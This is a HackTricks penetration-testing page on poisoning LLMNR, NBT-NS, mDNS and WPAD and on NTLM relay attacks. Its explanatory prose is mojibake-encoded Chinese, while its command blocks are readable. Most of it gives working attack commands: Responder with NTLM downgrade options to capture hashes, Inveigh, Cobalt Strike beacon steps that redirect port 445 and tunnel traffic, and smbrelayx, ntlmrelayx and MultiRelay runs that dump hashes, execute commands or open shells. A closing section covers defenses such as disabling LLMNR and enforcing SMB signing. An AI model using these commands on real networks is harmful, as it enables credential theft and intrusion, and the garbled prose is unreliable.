# ä¼ªé€  LLMNRã€NBT-NSã€mDNS/DNS å’Œ WPAD ä»¥åŠä¸­ç»§æ”»å‡»

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆçš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“
- **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live) ä¸Š**å…³æ³¨**æˆ‘ä»¬ã€‚
- é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## ç½‘ç»œåè®®

### LLMNRã€NBT-NS å’Œ mDNS

Microsoft ç³»ç»Ÿåœ¨ DNS æŸ¥è¯¢å¤±è´¥æ—¶ä½¿ç”¨é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æï¼ˆLLMNRï¼‰å’Œ NetBIOS åç§°æœåŠ¡ï¼ˆNBT-NSï¼‰è¿›è¡Œæœ¬åœ°ä¸»æœºè§£æã€‚Apple Bonjour å’Œ Linux é›¶é…ç½®å®ç°ä½¿ç”¨å¤šæ’­ DNSï¼ˆmDNSï¼‰æ¥å‘ç°ç½‘ç»œå†…çš„ç³»ç»Ÿã€‚è¿™äº›åè®®æœªç»èº«ä»½éªŒè¯ï¼Œé€šè¿‡ UDP å¹¿æ’­æ¶ˆæ¯ï¼›å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒä»¬å°†ç”¨æˆ·å¼•å¯¼åˆ°æ¶æ„æœåŠ¡ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ Responder æ¨¡æ‹Ÿè¢«ä¸»æœºæœç´¢çš„æœåŠ¡ï¼Œå‘é€è™šå‡å“åº”ã€‚\
é˜…è¯»æ›´å¤šå…³äº[å¦‚ä½•ä½¿ç”¨ Responder æ¨¡æ‹ŸæœåŠ¡](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)çš„ä¿¡æ¯ã€‚

### WPAD

è®¸å¤šæµè§ˆå™¨ä½¿ç”¨ Web ä»£ç†è‡ªåŠ¨å‘ç°ï¼ˆWPADï¼‰ä»ç½‘ç»œåŠ è½½ä»£ç†è®¾ç½®ã€‚WPAD æœåŠ¡å™¨é€šè¿‡ç‰¹å®š URLï¼ˆä¾‹å¦‚ï¼Œ_http://wpad.example.org/wpad.dat_ï¼‰æä¾›å®¢æˆ·ç«¯ä»£ç†è®¾ç½®ï¼Œå½“é€šè¿‡ä»¥ä¸‹ä»»ä¸€æ–¹å¼è¯†åˆ«æ—¶ï¼š

- DHCPï¼Œä½¿ç”¨ä»£ç  252 æ¡ç›®[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
- DNSï¼Œåœ¨æœ¬åœ°åŸŸä¸­æœç´¢ _wpad_ ä¸»æœºå
- Microsoft LLMNR å’Œ NBT-NSï¼ˆåœ¨ DNS æŸ¥è¯¢å¤±è´¥æ—¶ï¼‰

Responder è‡ªåŠ¨åŒ–äº† WPAD æ”»å‡» â€” è¿è¡Œä»£ç†å¹¶é€šè¿‡ DHCPã€DNSã€LLMNR å’Œ NBT-NS å°†å®¢æˆ·ç«¯å¼•å¯¼åˆ°æ¶æ„ WPAD æœåŠ¡å™¨ã€‚

## åè®®ä¸­æ¯’

### Responder - LLMNRã€NBT-NS å’Œ MDNS

> Responder æ˜¯ä¸€ä¸ª LLMNRã€NBT-NS å’Œ MDNS æ¯’åŒ–å·¥å…·ã€‚å®ƒå°†æ ¹æ®å…¶åç§°åç¼€å›ç­” _ç‰¹å®š_ NBT-NSï¼ˆNetBIOS åç§°æœåŠ¡ï¼‰æŸ¥è¯¢ï¼ˆå‚è§ï¼š[http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥å·¥å…·ä»…ä¼šå›ç­”ç”¨äº SMB çš„æ–‡ä»¶æœåŠ¡å™¨æœåŠ¡è¯·æ±‚ã€‚
>
> è¿™èƒŒåçš„æ¦‚å¿µæ˜¯é’ˆå¯¹æˆ‘ä»¬çš„ç­”æ¡ˆï¼Œå¹¶åœ¨ç½‘ç»œä¸Šæ›´éšè”½ã€‚è¿™ä¹Ÿæœ‰åŠ©äºç¡®ä¿æˆ‘ä»¬ä¸ä¼šç ´ååˆæ³•çš„ NBT-NS è¡Œä¸ºã€‚

- [**Responder**](https://github.com/lgandx/Responder) é»˜è®¤å®‰è£…åœ¨ kali ä¸­ï¼Œé…ç½®æ–‡ä»¶ä½äº \*\*`/etc/responder/Responder.conf` \*\*ï¼ˆæ‚¨å¯ä»¥åœ¨æ­¤å¤„ç¦ç”¨æ¶æ„æœåŠ¡å™¨ï¼‰
- **Responder** å°†åœ¨å±å¹•ä¸Š**æ‰“å°å“ˆå¸Œå€¼**å¹¶å°†å…¶å†™å…¥ä½äº `/usr/share/responder/logs` ç›®å½•ä¸­æ¯ä¸ªä¸»æœºçš„**æ—¥å¿—**æ–‡ä»¶ä¸­ã€‚å“ˆå¸Œå€¼ä»¥ `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt` æ ¼å¼ä¿å­˜
- æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°**windows** ç‰ˆæœ¬çš„ Responder [here](https://github.com/lgandx/Responder-Windows)
- Responder æ”¯æŒ **ipv4** å’Œ **ipv6**

#### Responder å‚æ•°

Responder æ”¯æŒä»¥ä¸‹é€‰é¡¹ï¼š
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>Responder å‚æ•°</summary>

* `-A` æ ‡å¿—å°†æˆ‘ä»¬ç½®äº**åˆ†ææ¨¡å¼**ï¼Œå…è®¸æˆ‘ä»¬åœ¨ç¯å¢ƒä¸­æŸ¥çœ‹ NBT-NSã€BROWSER å’Œ LLMNR è¯·æ±‚ï¼Œè€Œä¸ä¼šå¯¹ä»»ä½•å“åº”è¿›è¡Œæ¯’åŒ–ã€‚
* æˆ‘ä»¬å¿…é¡»å§‹ç»ˆæä¾›æ¥å£æˆ– IPã€‚
* `-wf` å°†å¯åŠ¨ WPAD æ¶æ„ä»£ç†æœåŠ¡å™¨ã€‚
* `-f` å°†å°è¯•å¯¹è¿œç¨‹ä¸»æœºçš„æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ã€‚
* ä½¿ç”¨ `-v` æ ‡å¿—å¯å¢åŠ è¯¦ç»†ç¨‹åº¦ï¼ˆå°†å¤§é‡é™„åŠ æ•°æ®æ‰“å°åˆ°æ§åˆ¶å°ï¼‰ã€‚
* è¯¸å¦‚ `-F` å’Œ `-P` çš„é€‰é¡¹å¯ç”¨äºå¼ºåˆ¶ NTLM æˆ–åŸºæœ¬èº«ä»½éªŒè¯å’Œå¼ºåˆ¶ä»£ç†èº«ä»½éªŒè¯ï¼Œä½†å¯èƒ½ä¼šå¯¼è‡´ç™»å½•æç¤ºï¼Œå› æ­¤åº”è°¨æ…ä½¿ç”¨ã€‚
* `-w` æ ‡å¿—åˆ©ç”¨å†…ç½®çš„ WPAD ä»£ç†æœåŠ¡å™¨ã€‚è¿™å¯èƒ½éå¸¸æœ‰æ•ˆï¼Œç‰¹åˆ«æ˜¯åœ¨å¤§å‹ç»„ç»‡ä¸­ï¼Œå› ä¸ºå®ƒå°†æ•è·æ‰€æœ‰å¯åŠ¨ Internet Explorer çš„ç”¨æˆ·å‘å‡ºçš„æ‰€æœ‰ HTTP è¯·æ±‚ï¼Œå¦‚æœæµè§ˆå™¨å¯ç”¨äº†[è‡ªåŠ¨æ£€æµ‹è®¾ç½®](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11)ã€‚

</details>

#### è¿è¡Œ Responder

è¦è¿è¡Œé»˜è®¤çš„ Responder è¡Œä¸ºï¼Œæ‚¨åªéœ€æ‰§è¡Œï¼š
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
ä¸€ä¸ªæœ‰è¶£çš„æŠ€å·§æ˜¯ä½¿ç”¨ responder åœ¨å¯èƒ½çš„æƒ…å†µä¸‹é™çº§ NTLM è®¤è¯ã€‚è¿™å°†å…è®¸**æ•è· NTLMv1 æŒ‘æˆ˜å’Œå“åº”**ï¼Œè€Œä¸æ˜¯å¯ä»¥**è½»æ¾ç ´è§£**çš„ NTLMv2 [**æŒ‰ç…§è¿™ä¸ªæŒ‡å—**](../../windows-hardening/ntlm/#ntlmv1-attack)**ã€‚**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
é»˜è®¤æƒ…å†µä¸‹ï¼ŒWPADå†’å……ä¸ä¼šè¢«æ‰§è¡Œï¼Œä½†æ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```bash
responder -I <Iface> --wpad
```
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨**æ‚¨çš„IP**è§£æNetBIOSè¯·æ±‚ã€‚å¹¶åˆ›å»ºä¸€ä¸ª**èº«ä»½éªŒè¯ä»£ç†**ï¼š
```bash
responder.py -I <interface> -Pv
```
æ— æ³•æ‹¦æˆªNTLMå“ˆå¸Œï¼ˆé€šå¸¸æƒ…å†µä¸‹ï¼‰ï¼Œä½†å¯ä»¥è½»æ¾è·å–ä¸€äº›**NTLMæŒ‘æˆ˜å’Œå“åº”**ï¼Œç„¶åå¯ä»¥ä½¿ç”¨ä¾‹å¦‚_**john**_é€‰é¡¹`--format=netntlmv2`æ¥**ç ´è§£**ã€‚

é»˜è®¤çš„_**Responder**_å®‰è£…åœ¨kaliä¸­çš„**æ—¥å¿—å’ŒæŒ‘æˆ˜**å¯ä»¥åœ¨`/usr/share/responder/logs`ä¸­æ‰¾åˆ°ã€‚

#### Responder - DHCPä¸­æ¯’

Windowsä½¿ç”¨å‡ ä¸ªè‡ªå®šä¹‰çš„DHCPé€‰é¡¹ï¼Œå¦‚NetBIOSã€WINSã€WPADè®¾ç½®ã€‚å½“å·¥ä½œç«™å‘é€DHCPè¯·æ±‚ä»¥è·å–å…¶ç½‘ç»œè®¾ç½®æ—¶ï¼Œè¿™äº›é™„åŠ è®¾ç½®å¯ä»¥åŒ…å«åœ¨DHCPç­”å¤ä¸­ï¼Œä»¥ä¿ƒè¿›ç›´æ¥çš„è¿æ¥å’Œåç§°è§£æã€‚

æ¬ºéª—DHCPå“åº”è€Œä¸é€ æˆå¹²æ‰°å¯èƒ½å…·æœ‰æŒ‘æˆ˜æ€§ï¼Œå› ä¸ºè¿™ä¼šå¹²æ‰°å·¥ä½œç«™çš„ç½‘ç»œé…ç½®ã€‚é€šå¸¸ï¼Œæ‚¨éœ€è¦å¯¹ç›®æ ‡å­ç½‘æœ‰å¾ˆå¥½çš„äº†è§£ï¼ŒDNSæœåŠ¡å™¨åœ¨å“ªé‡Œï¼Œäº¤æ¢æœºåœ¨å“ªé‡Œï¼Œè·¯ç”±è¡¨ï¼ŒåŸŸï¼Œå­ç½‘æ©ç ï¼ŒDHCPæœåŠ¡å™¨ç­‰ã€‚**ä»»ä½•è¿™äº›è®¾ç½®çš„é”™è¯¯éƒ½ä¼šå¯¼è‡´ç½‘ç»œä¸­æ–­ã€‚**

ç„¶è€Œï¼Œæ¬ºéª—DHCPç­”å¤å…·æœ‰ç‹¬ç‰¹çš„å¥½å¤„ã€‚**å®ƒç»å¯¹æ¯”ARPä¸­æ¯’æ›´éšè”½**ï¼›ä¸€ä¸ªå•æ’­å“åº”å°±è¶³ä»¥æ°¸ä¹…ä¸­æ¯’å—å®³è€…çš„è·¯ç”±ä¿¡æ¯ï¼Œç½‘ç»œä¸Šé€šå¸¸ä¹Ÿä¼šçœ‹åˆ°å¤šä¸ªDHCPæœåŠ¡å™¨åœ¨è¿è¡Œã€‚å•æ’­DHCPç­”å¤æ›´éš¾æ£€æµ‹ï¼Œä¸€äº›äº¤æ¢æœºæä¾›å®‰å…¨è®¾ç½®ä»¥é˜²æ­¢DHCPçª¥æ¢ï¼Œä½†æ˜¯å½“å¯ç”¨æ—¶ï¼Œè¿™äº›è®¾ç½®å¹¶ä¸ç›´è§‚ï¼Œé€šå¸¸åœ¨é…ç½®æ—¶ä¼šå‡ºç°é”™è¯¯ã€‚

> è¿™ç§æ”»å‡»éå¸¸æœ‰æ•ˆï¼Œå¹¶ç¡®ä¿è·å¾—NTLMv1/2å“ˆå¸Œã€‚
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - æ•è·å‡­è¯

Responderå°†**å†’å……æ‰€æœ‰ä½¿ç”¨æ‰€è¿°åè®®çš„æœåŠ¡**ã€‚ä¸€æ—¦æŸä¸ªç”¨æˆ·å°è¯•è®¿é—®ä½¿ç”¨è¿™äº›åè®®è§£æçš„æœåŠ¡ï¼Œ**ä»–å°†å°è¯•å¯¹æŠ—Responder**ï¼Œå¹¶ä¸”Responderå°†èƒ½å¤Ÿ**æ•è·**â€œå‡­è¯â€ï¼ˆå¾ˆå¯èƒ½æ˜¯**NTLMv2æŒ‘æˆ˜/å“åº”**ï¼‰ï¼š

å¯ä»¥å°è¯•é™çº§åˆ°NetNTLMv1æˆ–å°è¯•ç¦ç”¨ESSã€‚

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell Responder

> Inveighæ˜¯ä¸€ä¸ªPowerShell ADIDNS/LLMNR/NBNS/mDNS/DNSæ¬ºéª—å™¨å’Œä¸­é—´äººå·¥å…·ï¼Œæ—¨åœ¨å¸®åŠ©å‘ç°è‡ªå·±å—é™äºWindowsç³»ç»Ÿçš„æ¸—é€æµ‹è¯•äººå‘˜/çº¢é˜Ÿäººå‘˜ã€‚

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh)æ˜¯ä¸€ä¸ªPowerShellè„šæœ¬ï¼Œç°åœ¨æ˜¯ä¸€ä¸ªå…·æœ‰ä¸Responderç›¸åŒä¸»è¦åŠŸèƒ½çš„C#äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æœ‰ä¸€ä¸ª[**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)åˆ—å‡ºäº†æ‰€æœ‰å‚æ•°å’Œä½¿ç”¨è¯´æ˜ã€‚\
å¦ä¸€ä¸ªç‰ˆæœ¬å¯ä»¥åœ¨[**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)æ‰¾åˆ°ã€‚

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

æˆ–è€…ä½¿ç”¨æ›´å¤šé€‰é¡¹è¿è¡Œå®ƒï¼š
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
æˆ–è€…è¿è¡ŒC#ç‰ˆæœ¬ï¼š
```bash
Inveigh.exe
```
## NTLMä¸­ç»§æ”»å‡»

è¿™ç§æ”»å‡»å°†å†…éƒ¨ç½‘ç»œä¸Šçš„**SMBè®¤è¯ä¼šè¯**ä¸­ç»§åˆ°ä¸€ä¸ª**ç›®æ ‡æœºå™¨**ã€‚å¦‚æœè®¤è¯**ä¼šè¯æˆåŠŸ**ï¼Œå®ƒå°†è‡ªåŠ¨å°†æ‚¨**è½¬åˆ°ä¸€ä¸ªç³»ç»Ÿ** **shell**ã€‚è¯·æ³¨æ„ï¼Œä¸­ç»§çš„è®¤è¯å¿…é¡»æ¥è‡ªä¸€ä¸ªå…·æœ‰å¯¹ä¸­ç»§ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™çš„**ç”¨æˆ·**ï¼Œå¹¶ä¸”**SMBç­¾åå¿…é¡»è¢«ç¦ç”¨**ã€‚

### 445ç«¯å£è½¬å‘å’Œéš§é“

{% hint style="warning" %}
å¦‚æœæ‚¨å¯ä»¥**å¼•å…¥ä¸€ä¸ªæœºå™¨åˆ°ç½‘ç»œå†…éƒ¨**ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹éƒ¨åˆ†çš„ä»»ä½•**å·¥å…·**æ¥æ‰§è¡Œä¸€ä¸ªä¸­ç»§æ”»å‡»ï¼Œæ‚¨ä¸éœ€è¦æ‹…å¿ƒè¿™ä¸ªã€‚
{% endhint %}

ç„¶è€Œï¼Œåœ¨çº¢é˜Ÿä¸­ï¼Œæƒ…å†µå¹¶éå¦‚æ­¤ï¼Œåœ¨çº¢é˜Ÿä¸­ï¼Œé€šå¸¸éœ€è¦**å°†Windowsæœºå™¨çš„ç«¯å£445çš„æµé‡è½¬å‘åˆ°æ‚¨çš„æœºå™¨**ï¼Œæ‰§è¡Œä»¥ä¸‹ä»»ä½•å·¥å…·ï¼Œç„¶åé€šè¿‡ä»£ç†**å°†è¯¥å·¥å…·çš„æµé‡è·¯ç”±å›æ¥**ï¼Œä»¥è¾¾åˆ°å†…éƒ¨æ”»å‡»æœºå™¨çš„ç›®çš„ã€‚

å·¥å…·[**PortBender**](https://github.com/praetorian-inc/PortBender)æ˜¯ä¸€ä¸ª**é©±åŠ¨ç¨‹åº**ï¼Œç”¨äºå°†ç›®çš„åœ°ä¸ºç«¯å£**445çš„æµé‡é‡å®šå‘åˆ°å¦ä¸€ä¸ªç«¯å£**ï¼ˆä¾‹å¦‚8445ï¼‰ï¼Œ**æˆ‘ä»¬å¯ä»¥ç»‘å®š**ã€‚éœ€è¦**æœ¬åœ°ç®¡ç†å‘˜**è®¿é—®æƒé™æ‰èƒ½åŠ è½½é©±åŠ¨ç¨‹åºã€‚åœ¨è¿™é‡Œä½¿ç”¨`cd C:\Windows\System32\drivers`æ˜¯æœ‰é“ç†çš„ï¼Œå› ä¸ºå¤§å¤šæ•°Windowsé©±åŠ¨ç¨‹åºéƒ½åœ¨è¿™é‡Œã€‚
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

å¦‚æœè¦ä½¿ç”¨**MultiRelay**ï¼Œè¯·è½¬åˆ°_**/usr/share/responder/tools**_å¹¶æ‰§è¡ŒMultiRelay (`-t <IP target> -u <User>`):
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
![](<../../.gitbook/assets/image (209).png>)

### å¼ºåˆ¶ NTLM ç™»å½•

åœ¨ Windows ä¸­ï¼Œæ‚¨**å¯èƒ½èƒ½å¤Ÿå¼ºåˆ¶ä¸€äº›ç‰¹æƒå¸æˆ·å¯¹ä»»æ„æœºå™¨è¿›è¡Œèº«ä»½éªŒè¯**ã€‚é˜…è¯»ä»¥ä¸‹é¡µé¢ä»¥äº†è§£å¦‚ä½•æ“ä½œï¼š

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## è§£å†³æ–¹æ¡ˆ

### ç¦ç”¨ LLMNR

è¦ä¸º DNS å®¢æˆ·ç«¯åœ¨æ‚¨çš„åŸŸä¸­ç¦ç”¨ LLMNRï¼Œè¯·æ‰“å¼€ gpedit.mscã€‚\
å¯¼èˆªè‡³è®¡ç®—æœºé…ç½®->ç®¡ç†æ¨¡æ¿->ç½‘ç»œ->DNS å®¢æˆ·ç«¯ã€‚\
æ‰¾åˆ°é€‰é¡¹â€œå…³é—­å¤šæ’­åç§°è§£æâ€å¹¶å•å‡»â€œç­–ç•¥è®¾ç½®â€ï¼š

![](../../.gitbook/assets/1.jpg)

æ–°çª—å£æ‰“å¼€åï¼Œå¯ç”¨æ­¤é€‰é¡¹ï¼ŒæŒ‰â€œåº”ç”¨â€ç„¶åå•å‡»â€œç¡®å®šâ€ï¼š

![](../../.gitbook/assets/2.jpg)

### **ç¦ç”¨ NBT-NS**

ç¦ç”¨ NBT-NS çš„ä¸€ç§é€‰é¡¹æ˜¯ä½¿ç”¨ DHCP èŒƒå›´é€‰é¡¹ã€‚

å¦‚æœä½¿ç”¨ Microsoft çš„ DHCP æœåŠ¡å™¨ï¼Œè¯·é€‰æ‹©è¦ç¦ç”¨ NBT-NS çš„èŒƒå›´ã€‚å³é”®å•å‡»â€œèŒƒå›´é€‰é¡¹â€ï¼Œç„¶åå•å‡»â€œé…ç½®é€‰é¡¹â€ã€‚åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘è¦ä¸ºå…¶ç¦ç”¨ NBT-NS çš„ DHCP èŒƒå›´æ˜¯ 192.168.1.100ã€‚

![](../../.gitbook/assets/3.jpg)

åœ¨èŒƒå›´é€‰é¡¹çª—å£ä¸­ï¼Œå¯¼èˆªåˆ°é«˜çº§é€‰é¡¹æ ‡ç­¾ï¼Œå°†ä¸‹æ‹‰çª—å£æ›´æ”¹ä¸ºâ€œMicrosoft Windows 2000 é€‰é¡¹â€ï¼š

![](../../.gitbook/assets/4.jpg)

ä»åˆ—è¡¨ä¸­é€‰æ‹©â€œ001 Microsoft ç¦ç”¨ Netbios é€‰é¡¹â€ï¼Œå°†å…¶å€¼æ›´æ”¹ä¸ºâ€œ0x2â€ï¼Œå•å‡»åº”ç”¨ï¼Œç„¶åå•å‡»ç¡®å®šï¼š

![](../../.gitbook/assets/5.jpg)

### WPAD

ä¸ºäº†é˜²èŒƒ WPAD æ”»å‡»ï¼Œæ‚¨å¯ä»¥åœ¨ DNS åŒºåŸŸä¸­æ·»åŠ ä¸€ä¸ªâ€œwpadâ€æ¡ç›®ã€‚è¯·æ³¨æ„ï¼ŒDNS æ¡ç›®ä¸éœ€è¦æŒ‡å‘æœ‰æ•ˆçš„ WPAD æœåŠ¡å™¨ã€‚åªè¦æŸ¥è¯¢å¾—åˆ°è§£æï¼Œæ”»å‡»å°±ä¼šè¢«é˜»æ­¢ã€‚

### å¤šä¸­ç»§

1\. **å¼ºåˆ¶æ‰€æœ‰æœ¬åœ° Windows æœºå™¨ä¸Šå¯ç”¨ SMB ç­¾å**ã€‚æ­¤è®¾ç½®å°†ä¸ºæ¯ä¸ª SMB ä¼šè¯è¿›è¡Œæ•°å­—ç­¾åï¼Œå¼ºåˆ¶å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åœ¨ç»§ç»­ä¹‹å‰éªŒè¯æ•°æ®åŒ…çš„æ¥æºã€‚æ­¤è®¾ç½®ä»…åœ¨åŸŸæ§åˆ¶å™¨ä¸Šé»˜è®¤å¯ç”¨ã€‚Microsoft çš„ä»¥ä¸‹æ–‡ç« è¯¦ç»†ä»‹ç»äº†è¿™äº›è®¾ç½®ï¼ˆå¯é€šè¿‡ç»„ç­–ç•¥å¯ç”¨ï¼‰ï¼Œä»¥åŠå¦‚ä½•å®æ–½è¿™äº›è®¾ç½®ã€‚

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **å®¡æŸ¥å¹¶ç¡®ä¿æœ¬åœ°ç½‘ç»œä¸Šçš„ç”¨æˆ·åªèƒ½è¿œç¨‹ç™»å½•åˆ°å¿…è¦çš„æœºå™¨**ã€‚ä¾‹å¦‚ï¼šSally åªèƒ½ç™»å½•åˆ° Sally çš„å·¥ä½œç«™ã€‚å¦‚æœæ”»å‡»è€…æ‹¦æˆªäº† Sally çš„ SMB è®¤è¯ä¼šè¯ï¼Œä»–ä»¬æ— æ³•å°†ä¼šè¯ä¸­ç»§åˆ°ä»»ä½•å·¥ä½œç«™ï¼Œä½¿æ­¤æ–¹æ³•æ— æ•ˆã€‚

3\. **å°½å¯èƒ½é™åˆ¶æœ¬åœ°ç½‘ç»œä¸Šçš„ NTLM è®¤è¯**ã€‚æ­¤æ”»å‡»æ— æ³•åˆ©ç”¨ Kerberos è®¤è¯ï¼Œå› æ­¤é€šè¿‡é™åˆ¶ NTLM çš„æ•°é‡ï¼Œå¯ä»¥å¤§å¤§é˜»ç¢æ­¤æ”»å‡»ã€‚Microsoft æœ‰å…³å¦‚ä½•å®ç°æ­¤æ“ä½œçš„ä¿¡æ¯ï¼Œä½†è¯·æ³¨æ„... å¦‚æœ Kerberos è®¤è¯ç”±äºæŸç§åŸå› å¤±è´¥ï¼Œé€šå¸¸ä¼šé€€å›åˆ° NTLMã€‚å¦‚æœå®Œå…¨ç¦ç”¨å®ƒï¼Œæ‚¨çš„ç½‘ç»œå¯èƒ½ä¼šé™·å…¥åœé¡¿ã€‚

